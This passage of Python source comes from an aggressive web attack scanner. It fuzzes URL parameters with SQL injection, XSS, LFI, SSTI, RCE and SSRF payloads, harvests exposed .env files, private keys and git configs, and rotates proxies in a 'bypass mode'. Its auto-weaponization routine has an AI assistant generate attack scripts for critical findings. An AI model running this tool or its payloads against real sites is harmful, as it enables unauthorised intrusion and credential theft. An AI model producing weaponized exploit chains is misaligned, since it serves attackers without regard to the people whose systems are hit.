                 "1' AND SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--",
                 "1 OR pg_sleep(5)--", "1' OR (SELECT 1 FROM (SELECT SLEEP(5))A)--"
             ]
             deep_xss = [
                 "\"><svg/onload=alert(1)>", "'-alert(1)-'", "\\\";alert(1);//"
             ]
             payload_groups["SQLi_Blind"] = (deep_sqli, []) # Evaluated by Time
             
             # Expand standard XSS payloads locally for deep mode
             Payloads.XSS.extend(deep_xss)

        # XSS Check separately (reflection based)
        for param, values in params.items():
            # 1. Check XSS (Reflection)
            for payload in Payloads.XSS:
                try:
                    # Construct fuzzed URL
                    fuzzed_query = urlencode({p: (values[0] if p != param else payload) for p in params})
                    fuzzed_url = f"{base_url}?{fuzzed_query}"
                    
                    status, content, _ = await self._safe_request('GET', fuzzed_url)
                    text_content = content.decode('utf-8', errors='ignore')
                    
                    if payload in text_content:
                         # Simple reflection check
                         vuln = Vulnerability(target=url, vuln_type="Reflected XSS", severity="High", impact=f"Payload reflected in {param}")
                         self.finding_found.emit(vuln)
                         self.log_message.emit(f"<span style='color:#ff0055'>[!] XSS FOUND on parameter '{param}'</span>")
                         break # Stop after one XSS found
                except: pass

            # 2. Check Other Vulns (Indicator based and Time Based)
            for v_type, (p_list, indicators) in payload_groups.items():
                for payload in p_list:
                    try:
                        fuzzed_query = urlencode({p: (values[0] if p != param else payload) for p in params})
                        fuzzed_url = f"{base_url}?{fuzzed_query}"
                        
                        start_time = time.time()
                        status, content, _ = await self._safe_request('GET', fuzzed_url)
                        elapsed = time.time() - start_time
                        
                        # Heuristic Time-based Blind SQLi Detection
                        if v_type == "SQLi_Blind" and elapsed >= 4.5:
                             vuln = Vulnerability(target=url, vuln_type="Time-Based Blind SQLi", severity="Critical", impact=f"Server stalled for {elapsed:.2f}s on parameter '{param}'")
                             self.finding_found.emit(vuln)
                             self.log_message.emit(f"<span style='color:#ff0055'>[!] {v_type} DETECTED on parameter '{param}' (Time: {elapsed:.2f}s)</span>")
                             break
                             
                        text_content = content.decode('utf-8', errors='ignore')
                        
                        # Check indicators
                        for ind in indicators:
                            if ind in text_content:
                                 # Found!
                                 vuln = Vulnerability(target=url, vuln_type=v_type, severity="Critical", impact=f"Indicator '{ind}' found with payload: {payload[:20]}...")
                                 self.finding_found.emit(vuln)
                                 self.log_message.emit(f"<span style='color:#ff0055'>[!] {v_type} DETECTED on parameter '{param}' (Indicator: {ind})</span>")
                                 break # Stop checking this type for this param if found
                        else:
                            continue
                        break # Break outer loop (payloads) if inner loop (indicators) broke
                    except: pass



    async def detect_tech(self, url):
        status, content, headers = await self._safe_request('GET', url, headers=self.get_headers(), timeout=5)
        text_content = content.decode('utf-8', errors='ignore')
        self.extract_sensitive_data(text_content, url)
        await self.analyze_forms(url, text_content)
        await self.analyze_js_files(url) 
        
        tech_stack = []
        server = headers.get('Server', '').lower()
        powered = headers.get('X-Powered-By', '').lower()
        
        if 'php' in powered or 'php' in server: tech_stack.append('php')
        if 'asp' in powered or 'iis' in server: tech_stack.append('asp')
        if 'nginx' in server: tech_stack.append('nginx')
        if 'express' in powered or 'node' in powered: tech_stack.append('node')
        
        return tech_stack

    def _validate_content(self, path, content):
        """Validates content to STRICTLY prevent HTML soft-404s from being saved as evidence."""
        if not content: return False
        
        # Convert snippet to lower for case-insensitive checking
        header = content[:1500].lower()
        
        # STRONG indicators of HTML/SPA (React, Vue, Vite, etc)
        spa_indicators = [
            b"<!doctype html", b"<html", b"<body", b"<div id=\"root\"", 
            b"<div id=\"app\"", b"vite-plugin-pwa", b"react", b"vue", 
            b"angular", b"nextjs"
        ]
        
        # Check if it looks like a webpage
        is_webpage = any(ind in header for ind in spa_indicators)

        if path.endswith(".sql"):
            # SQL MUST have SQL keywords and MUST NOT be a webpage
            sql_keywords = [b"insert into", b"create table", b"drop table", b"select ", b"values (", b"-- dumping data"]
            has_sql = any(k in header for k in sql_keywords)
            return has_sql and not is_webpage
            
        if path.endswith(".env"):
            # Env MUST have key=value pairs and MUST NOT be a webpage
            has_assign = b"=" in content and b"\n" in content
            return has_assign and not is_webpage
            
        if path.endswith(".git/config"):
            return b"[core]" in content or b"[remote" in content
            
        if path.endswith("id_rsa"):
            return b"PRIVATE KEY" in content
            
        if path.endswith(".yml") or path.endswith(".yaml"):
            return b":" in content and not is_webpage
            
        if path.endswith(".php"):
             if "phpinfo" in path:
                 return b"phpinfo()" in content or b"PHP Version" in content
             # For config.php, if it's executable code (<?php), it's valid finding
             if b"<?php" in content: return True
             return False
        
        # Default: If it looks like a webpage, reject it (unless we are looking for a webpage?)
        if is_webpage: return False
        
        return True

    async def check_sensitive_files(self, url):
        base_url = url.rstrip('/')
        tasks = []

        async def check_path(path):
            full_url = f"{base_url}/{path}"
            status, content, _ = await self._safe_request('GET', full_url, headers=self.get_headers(), allow_redirects=False, timeout=5)
            
            if status == 200:
                if not self._validate_content(path, content):
                    return

                text_content = content.decode('utf-8', errors='ignore')
                self.extract_sensitive_data(text_content, full_url)
                
                vuln_name = "Sensitive File Exposure"
                if path == ".env" and b"APP_KEY" in content: vuln_name = "Critical .env Exposure"
                
                vuln = Vulnerability(target=full_url, vuln_type=vuln_name, severity="CRITICAL", impact=f"Exposed {path}")
                self._emit_finding(vuln)
                self.log_message.emit(f"<span style='color:#ff0055'>[!] VULNERABILITY: {vuln_name} at {full_url}</span>")
                
                # Auto-save critical file evidence (EXACT BYTES)
                self.save_evidence(full_url, vuln_name, content)

        # Lazy task creation to avoid "coroutine never awaited" warning on early stop
        for i in range(0, len(self.sensitive_paths), 10):
            if not self.is_running: break
            batch_paths = self.sensitive_paths[i:i+10]
            # Create coroutines for this batch only
            batch_tasks = [check_path(p) for p in batch_paths]
            await asyncio.gather(*batch_tasks)

    async def fuzz_parameters(self, url, tech_stack):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params: return

        active_payloads = {
            'SQLi': Payloads.SQLI,
            'XSS': Payloads.XSS,
            'IDOR': []
        }
        
        if 'php' in tech_stack or not tech_stack:
            active_payloads['LFI'] = Payloads.LFI
            active_payloads['SSTI'] = [p for p in Payloads.SSTI if '{php}' in p or '{{' in p]
        
        if 'node' in tech_stack:
            active_payloads['RCE'] = [p for p in Payloads.RCE if 'process' in p or 'require' in p]
            active_payloads['Prototype Pollution'] = Payloads.PROTO_POLLUTION
        else:
            active_payloads['RCE'] = Payloads.RCE

        # Load safe_fuzz_cases dynamically to improve performance
        try:
            import json, os
            fuzz_file = os.path.join(os.path.dirname(__file__), '..', 'safe_fuzz_cases.json')
            if os.path.exists(fuzz_file):
                 with open(fuzz_file, 'r', encoding='utf-8') as f:
                     raw_fuzz = json.load(f)
                 # Add 5000 variations for deep intensive fuzzing
                 active_payloads['Advanced Fuzzing (Custom)'] = [item.get('payload', '') for item in raw_fuzz if 'payload' in item][:5000]
        except Exception as e:
             self.log_message.emit(f"<span style='color:#ff0000'>[!] Failed to load safe_fuzz_cases: {e}</span>")

        # Queue-based Worker Pattern
        # 1. Create a Queue
        queue = asyncio.Queue()

        # 2. Populate Queue
        for param in params:
            for vuln_type, payloads in active_payloads.items():
                for payload in payloads:
                    if not payload: continue
                    severity = "CRITICAL" if vuln_type in ["SQLi", "RCE", "LFI", "Advanced Fuzzing (Custom)"] else "HIGH"
                    # Default indicators if missing
                    indicators = getattr(Indicators, vuln_type.split()[0].upper(), []) if hasattr(Indicators, vuln_type.split()[0].upper()) else [payload]
                    if not indicators: indicators = [payload]
                    self._inject(parsed, params, param, payload, vuln_type, severity, indicators, queue)

            for payload in [SSRF_PAYLOAD]:
                 self._inject(parsed, params, param, payload, "Potential SSRF", "CRITICAL", ["sheriff-token"], queue)

        # 3. Start Workers
        # Fixed concurrency of 10 workers for stability on Windows/qasync
        workers = []
        for _ in range(10):
            task = asyncio.create_task(self._fuzz_worker(queue))
            workers.append(task)
            
        # 4. Wait for queue to be processed
        await queue.join()
        
        # 5. Cancel workers
        for w in workers: w.cancel()

    def _inject(self, parsed, params, param, payload, vuln_type, severity, indicators, queue):
        fuzzed_query = params.copy()
        fuzzed_query[param] = [payload]
        new_query = urlencode(fuzzed_query, doseq=True)
        target_url = urlunparse(parsed._replace(query=new_query))
        
        # Push to Queue (Non-blocking)
        queue.put_nowait((target_url, vuln_type, severity, indicators))

    async def _fuzz_worker(self, queue):
        """Worker that consumes fuzzing tasks from the queue."""
        while True:
            # Get a work item
            url, vuln_type, severity, indicators = await queue.get()
            
            try:
                 # Small sleep to yield control to GUI event loop
                 await asyncio.sleep(0.01)
                 await self._do_fuzz_request(url, vuln_type, severity, indicators)
            except Exception:
                pass
            finally:
                # Notify queue that item is done
                queue.task_done()

    async def _do_fuzz_request(self, url, vuln_type, severity, indicators):
         # No Semaphore needed here as concurrency is limited by worker count
         try:
             status, content, _ = await self._safe_request('GET', url, headers=self.get_headers(), timeout=5)
             text_content = content.decode('utf-8', errors='ignore')
             self.extract_sensitive_data(text_content, url)
             
             for indicator in indicators:
                 if indicator in text_content: 
                      vuln = Vulnerability(target=url, vuln_type=vuln_type, severity=severity, impact=f"Indicator '{indicator}' found")
                      self._emit_finding(vuln)
                      self.log_message.emit(f"<span style='color:#ff0055'>[!] DETECTED: {vuln_type} on {url} (Indicator: {indicator})</span>")
                      
                      # Auto-save fuzzing evidence
                      self.save_evidence(url, vuln_type, text_content)
         except Exception:
             pass

    def save_evidence(self, url, vuln_type, content, extension=None):
        """Saves critical evidence to a local file, preserving original filename/extension."""
        try:
            parsed = urlparse(url)
            hostname = parsed.hostname or "unknown_target"
            path = parsed.path
            
            # Extract basic filename from URL
            url_filename = os.path.basename(path)
            
            # Determine extension if not provided
            if not extension:
                if url_filename and "." in url_filename:
                    _, ext = os.path.splitext(url_filename)
                    extension = ext.lstrip('.')
                else:
                    extension = "txt"
            
            # Sanitize Hostname & Vuln Type
            safe_hostname = "".join([c if c.isalnum() or c in ".-" else "_" for c in hostname])
            safe_vuln = "".join([c if c.isalnum() or c in ".-" else "_" for c in vuln_type])
            
            save_dir = os.path.join("scans", safe_hostname, safe_vuln)
            os.makedirs(save_dir, exist_ok=True)
            
            # Construct Filename
            timestamp = int(time.time())
            
            if url_filename:
                # Sanitize the original filename (keep .env, config.php, etc)
                safe_url_filename = "".join([c if c.isalnum() or c in ".-_" else "_" for c in url_filename])
                # If the sanitized name became empty or just dots (unlikely but possible), fallback
                if not safe_url_filename or all(c in '.' for c in safe_url_filename):
                     filename = f"evidence_{timestamp}.{extension}"
                else:
                     filename = f"{timestamp}_{safe_url_filename}"
            else:
                filename = f"evidence_{timestamp}.{extension}"
            
            file_path = os.path.join(save_dir, filename)
            
            # Write content based on type (Bytes = Exact Copy, Str = Log with Metadata)
            if isinstance(content, bytes):
                with open(file_path, "wb") as f:
                    f.write(content)
            else:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(f"URL: {url}\n")
                    f.write(f"Timestamp: {time.ctime()}\n")
                    f.write("-" * 40 + "\n")
                    f.write(content)
                
            self.log_message.emit(f"<span style='color:#00ff00'>[+] EVIDENCE SAVED: {file_path}</span>")
            return file_path
        except Exception as e:
            self.log_message.emit(f"<span style='color:#ff0000'>[!] Failed to save evidence: {str(e)}</span>")
            return None

    def _emit_finding(self, vuln):
        self.total_findings += 1
        if vuln.severity == "CRITICAL": 
            self.critical_findings += 1
            # AUTO-WEAPONIZE CRITICAL FINDINGS
            if self.ai_assistant:
                 asyncio.create_task(self._weaponize_critical_vuln(vuln))
                 
        self.finding_found.emit(vuln)
        self.stats_updated.emit(self.total_findings, self.critical_findings, self.request_count)

    async def _weaponize_critical_vuln(self, vuln):
        """Triggers a targeted weaponization attack chain for a specific critical finding."""
        if not self.ai_assistant: return
        
        self.log_message.emit(f"<span style='color:#ff00ff'>[!] TRIGGERING AUTO-WEAPONIZATION for {vuln.vuln_type}...</span>")
        
        try:
             # If it's a URL-based finding, we need to fetch some context first or just pass the URL
             # For deep attack chain, it usually wants HTML content.
             # We can try to fetch the page content of the vulnerable URL
             async with self.session.get(vuln.target, timeout=10) as r:
                  content = await r.text()
                  
             # Execute Deep Attack Chain
             # This will result in a weaponized script
             finding_info = f"Type: {vuln.vuln_type}, Target: {vuln.target}, Impact: {vuln.impact}"
             script = await self.ai_assistant.deep_attack_chain(vuln.target, content, finding_details=finding_info)
             
             if script and "ERROR" not in script:
                  self.log_message.emit(f"<span style='color:#00ff9d'>[⚔️] WEAPONIZED PAYLOAD READY for {vuln.vuln_type}</span>")
                  self.payload_generated.emit(vuln.target, script)
                  
                  # If we have an active browser session in run_scan, we could inject it.
                  # But since run_scan manages BrowserScanner instances locally in the loop, 
                  # we emit it so the user can run it from the Payloads tab.
             else:
                  self.log_message.emit(f"<span style='color:#ff5555'>[!] Weaponization failed for {vuln.vuln_type}</span>")
                  
        except Exception as e:
             self.log_message.emit(f"<span style='color:#ff5555'>[!] Weaponization Error: {str(e)}</span>")

    async def run_scan(self):
        try:
            self.is_running = True
            
            # Initialize Proxy Manager if in Bypass Mode
            if self.bypass_mode:
                self.log_message.emit("<span style='color:#00f3ff'>[*] Initializing Proxychains (Free Proxy Rotation)...</span>")
                await self.proxy_manager.initialize()
                
            self.session = aiohttp.ClientSession(read_bufsize=65536)
            
            self.log_message.emit("<h3 style='color:#00ff9d'>[*] INITIALIZING NEXUS V20 CORE...</h3>")
            self.log_message.emit(f"[*] Engine: Asyncio + Semaphore(50) | Bypass Mode: {self.bypass_mode}")
            self.log_message.emit("[*] Auto-Evidence Collection: ENABLED")
            
            scan_list = self.targets.copy()
            total_targets = len(scan_list)
            
            for i, target in enumerate(scan_list):
                if not self.is_running: break
                url = target['url']
                hostname = urlparse(url).hostname
                
                self.log_message.emit(f"<br><span style='color:#00f3ff; font-weight:bold'>[+] ANALYZING TARGET: {url}</span>")
                
                # WAF Detection
                await self.check_waf(url)
                

                # DNS Recon
                ips = self.resolve_domain(hostname)
                if ips: 
                    self.log_message.emit(f"<span style='color:#aaa'>    - DNS Resolution: {', '.join(ips)}</span>")
                    
                    # DIRECT IP ANALYSIS
                    import ipaddress
                    for ip in ips:
                        try:
                            ip_obj = ipaddress.ip_address(ip)
                            if not ip_obj.is_private:
                                self.log_message.emit(f"<span style='color:#00f3ff'>[*] Analyzing Public IP: {ip}</span>")
                                # 1. Geolocation (Simulated or via API if available, here just log)
                                # 2. Direct IP Access Check (Misconfigured VHosts)
                                async def check_direct_ip():
                                    try:
                                        # Try HTTP/HTTPS access to IP
                                        for proto in ['http', 'https']:
                                            target_ip = f"{proto}://{ip}"
                                            s, c, _ = await self._safe_request('GET', target_ip, timeout=5, verify_ssl=False)
                                            if s == 200:
                                                self.log_message.emit(f"<span style='color:#ffcc00'>[!] Direct IP Access Allowed: {target_ip} (Potential Info Leak)</span>")
                                                self.save_evidence(target_ip, "Direct_IP_Access", c)
                                                
                                                # Check for default pages
                                                lower_c = c.decode('utf-8', errors='ignore').lower()
                                                if "apache2 ubuntu default page" in lower_c or "iis windows server" in lower_c:
                                                     self.log_message.emit(f"<span style='color:#ffcc00'>[!] Default Server Page Detected on {ip}</span>")
                                    except: pass
                                
                                asyncio.create_task(check_direct_ip())
                                
                                # 3. Port Scan on IP (Parallel to domain scan)
                                asyncio.create_task(self.scan_ports(ip))
                        except: pass
                
                # Subdomain Enumeration
                ext = tldextract.extract(hostname)
                root_domain = f"{ext.domain}.{ext.suffix}"
                
                # 1. CRT.SH
                await self.enumerate_subdomains(root_domain)
                
                # 2. HackerTarget
                ht = HackerTargetEnumerator(root_domain)
                ht_subs = await ht.run()
                if ht_subs:
                     self.log_message.emit(f"<span style='color:#00ff9d'>[+] DISCOVERED {len(ht_subs)} SUBDOMAINS (HACKERTARGET):</span>")
                     for sub in ht_subs[:15]:
                          self.log_message.emit(f"<span style='color:#aaa'>    - {sub}</span>")
                          asyncio.create_task(self.check_takeover(sub))
                     if len(ht_subs) > 15:
                          self.log_message.emit(f"<span style='color:#aaa'>    - ... and {len(ht_subs)-15} more.</span>")
                     self.save_evidence(f"https://{root_domain}", "Subdomain_Recon_HT", "\n".join(sorted(ht_subs)))
                
                # Port Scanning is already handled via Direct IP Analysis (Async)
                # await self.scan_ports(hostname) -- REMOVED TO PREVENT DUPLICATES
                
                # Tech Detection & CMS
                tech_stack = await self.detect_tech(url)
                cms = await self.detect_cms(url)
                if cms:
                    self.log_message.emit(f"<span style='color:#ffcc00'>    - CMS DETECTED: {cms.upper()}</span>")
                    tech_stack.append(cms)
                
                if tech_stack: 
                    self.log_message.emit(f"<span style='color:#ffcc00'>    - Technology Stack: {', '.join(tech_stack).upper()}</span>")
                
                await self.check_sensitive_files(url)
                await self.check_balance_tampering(url)
                
                # Cloud Bucket Enum
                if self.targets and "domain" in self.targets[0]: # heuristic
                     pass # Already handled in enumerate_subdomains
                
                # 6. Auth Bypass & Privilege Escalation (aggressive)
                if self.bypass_mode and self.discovered_forms:
                    try:
                        from core.auth_bypass import AuthBypassEngine
                        auth_engine = AuthBypassEngine(self.session)
                        auth_engine.finding_found.connect(self._emit_finding)
                        auth_engine.log_message.connect(self.log_message.emit)
                        await auth_engine.run(url, self.discovered_forms)
                    except ImportError:
                        pass
                
                # Directory / Hidden File Brute Force
                try:
                    from core.directory_bruter import DirectoryBruter
                    bruter = DirectoryBruter(self.session, strict_validation=self.strict_validation)
                    bruter.finding_found.connect(self._emit_finding)
                    bruter.log_message.connect(self.log_message.emit)
                    await bruter.run(url)
                except ImportError:
                    self.log_message.emit("<span style='color:#ff0000'>[!] Directory module missing. Skipping.</span>")

                # CVE Scanner
                cve_scanner = CVEScanner(self.session)
                cve_scanner.finding_found.connect(self._emit_finding)
                cve_scanner.log_message.connect(self.log_message.emit)
                await cve_scanner.scan(url)
                
                # Browser-Based Scan (Playwright)
                try:
                    browser_scanner = BrowserScanner(
                        url, 
                        deep_scan=self.deep_scan, 
                        headless=self.headless,
                        ai_key=self.ai_key,
                        ai_model=self.ai_model
                    )
                    # Connect signals
                    browser_scanner.log_message.connect(self.log_message.emit)
                    browser_scanner.finding_found.connect(self._emit_finding)
                    browser_scanner.payload_generated.connect(self.payload_generated.emit)
                    
                    # Capture forms for Auth Engine
                    browser_scanner.forms_found.connect(lambda forms: self.discovered_forms.extend(forms))
                    
                    # Start Browser Session
                    await browser_scanner.initialize()
                    
                    # Scan Main Target
                    await browser_scanner.scan_page(url)
                    
                    if self.deep_scan:
                        # Spider/Crawl logic
                        if self.deep_scan:
                             await browser_scanner._spider_links()

                        crawler = WebCrawler(url)
                        fuzz_targets = await crawler.crawl(self.session, depth=2)
                        self.log_message.emit(f"<span style='color:#aaa'>    - Crawler discovered {len(fuzz_targets)} endpoints.</span>")
                        
                        # SYSTEMATIC ASSET ANALYSIS (New Phase)
                        # Combine crawled pages + discovered assets (JS/CSS)
                        all_analysis_targets = set(fuzz_targets)
                        if crawler.assets:
                            self.log_message.emit(f"<span style='color:#00ff9d'>[+] Crawler found {len(crawler.assets)} static assets (JS/CSS). Analyzing for secrets...</span>")
                            all_analysis_targets.update(crawler.assets)
                        
                        if all_analysis_targets:
                             self.log_message.emit(f"<span style='color:#00f3ff'>[*] Performing Static Analysis on {len(all_analysis_targets)} assets...</span>")
                             
                             async def analyze_asset(asset_url):
                                  try:
                                       s, c, _ = await self._safe_request('GET', asset_url, timeout=5)
                                       if c:
                                            self.extract_sensitive_data(c.decode('utf-8', errors='ignore'), asset_url)
                                  except:
                                       pass

                             # Batch process assets
                             analyze_tasks = [analyze_asset(u) for u in all_analysis_targets if not u.endswith(('.png', '.jpg', '.jpeg', '.gif', '.woff', '.woff2', '.ttf', '.svg', '.ico'))] 
                             # (Skip images/fonts)
                             
                             for i in range(0, len(analyze_tasks), 20):
                                  if not self.is_running: break
                                  await asyncio.gather(*analyze_tasks[i:i+20])

                        if crawler.login_pages:
                             self.log_message.emit(f"<span style='color:#ffcc00'>[!] Discovered {len(crawler.login_pages)} Login/Password Interfaces. Prioritizing...</span>")

                        # Scan discovered endpoints with Browser (Efficiency: Limit to 15 interesting ones to avoid timeout)
                        # Priority: Login Pages > Admin Pages > Parameter Pages
                        interesting_endpoints = list(crawler.login_pages)
                        
                        for u in fuzz_targets:
                            if u not in interesting_endpoints and len(interesting_endpoints) < 15:
                                 if "?" in u or "admin" in u or "login" in u:
                                      interesting_endpoints.append(u)
                        
                        if interesting_endpoints:
                            self.log_message.emit(f"<span style='color:#00f3ff'>[*] Deep Browser Analysis on {len(interesting_endpoints)} optimized targets...</span>")
                            for endpoint in interesting_endpoints:
                                 if not self.is_running: break
                                 await browser_scanner.scan_page(endpoint)
                        
                        # Standard Fuzzing
                        for f_url in fuzz_targets:
                            if not self.is_running: break
                            await self.fuzz_parameters(f_url, tech_stack)
                    
                    # Close Browser Session
                    await browser_scanner.stop()

                except Exception as e:
                    self.log_message.emit(f"<span style='color:#ff0000'>[!] Browser Module Failed: {str(e)}</span>")

                progress = int(((i + 1) / total_targets) * 100)
                self.progress_updated.emit(progress)
        
        except Exception as e:
             self.log_message.emit(f"<span style='color:#ff0000'>[!] CRITICAL SCANNER ERROR: {str(e)}</span>")
             import traceback
             traceback.print_exc()
        finally:
             if self.session:
                 await self.session.close()
             self.log_message.emit("<br><h3 style='color:#00ff9d'>[+] SCAN COMPLETE.</h3>")
             self.scan_finished.emit()
             self.is_running = False

    def stop_scan(self):
        self.is_running = False
        self.log_message.emit("<span style='color:#ff0055'>[!] SCAN ABORTED BY USER.</span>")

    async def detect_cms(self, url):
        """Detects common CMS using heuristic checks."""
        try:
            status, content, _ = await self._safe_request('GET', url, headers=self.get_headers())
            text = content.decode('utf-8', errors='ignore').lower()
            
            if "wp-content" in text or "wp-includes" in text: return "wordpress"
            if "joomla!" in text or "/templates/" in text: return "joomla"
            if "drupal" in text or "sites/all/themes" in text: return "drupal"
            if "magento" in text or "mage/" in text: return "magento"
            if "shopify" in text: return "shopify"
            if "wix.com" in text: return "wix"
            if "squarespace" in text: return "squarespace"
            
            return None
        except:
            return None
